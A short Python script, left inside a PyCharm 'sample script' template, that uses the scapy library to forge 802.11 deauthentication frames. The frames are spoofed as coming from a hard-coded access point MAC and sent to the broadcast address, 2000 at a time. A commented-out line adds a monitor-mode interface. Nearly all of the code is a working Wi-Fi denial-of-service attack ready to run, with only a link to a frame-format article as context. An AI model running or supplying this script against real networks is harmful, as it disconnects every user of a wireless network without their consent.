# This is a sample Python script.
#Source for Reason 7: the management frame.
# https://howiwifi.com/2020/07/13/802-11-frame-types-and-formats/
# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.



import scapy
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from scapy.sendrecv import sendp


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')
    print("Lets mess with scapy library")
    target_mac = "ff:ff:ff:ff:ff:ff"
    gateway_mac = "e8:94:f6:c4:97:3f"
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    # send the packet
    number_of_packets_to_send = 2000
    sendp(packet, count=number_of_packets_to_send)
    print('done')

    # sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)

    # See PyCharm help at https://www.jetbrains.com/help/pycharm/
